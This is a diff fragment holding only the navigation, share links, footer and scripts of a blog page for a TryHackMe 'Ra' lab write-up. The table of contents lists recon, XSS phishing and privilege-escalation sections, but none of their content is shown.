+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Write-Up"><span class="toc-number">2.</span> <span class="toc-text">Write Up</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RECON"><span class="toc-number">3.</span> <span class="toc-text">RECON</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#port-scan"><span class="toc-number">3.1.</span> <span class="toc-text">port scan</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">4.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#password-reset-through-information-gathering"><span class="toc-number">4.1.</span> <span class="toc-text">password reset through information gathering</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Phshing-through-openfire-Spark-XSS"><span class="toc-number">4.2.</span> <span class="toc-text">Phshing through openfire Spark XSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">5.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-Account-Operato"><span class="toc-number">5.1.</span> <span class="toc-text">Abusing Account Operato</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">6.</span> <span class="toc-text">After all</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/07/28/ra/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/07/28/ra/&text=Ra Write Up on TryHackMe"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/07/28/ra/&title=Ra Write Up on TryHackMe"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/07/28/ra/&is_video=false&description=Ra Write Up on TryHackMe"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Ra Write Up on TryHackMe&body=Check out this article: http://wha13.github.io/2024/07/28/ra/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/07/28/ra/&title=Ra Write Up on TryHackMe"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/07/28/ra/&title=Ra Write Up on TryHackMe"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/07/28/ra/&title=Ra Write Up on TryHackMe"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/07/28/ra/&title=Ra Write Up on TryHackMe"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/07/28/ra/&name=Ra Write Up on TryHackMe&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/07/28/ra/&t=Ra Write Up on TryHackMe"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2025
+    William Lin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
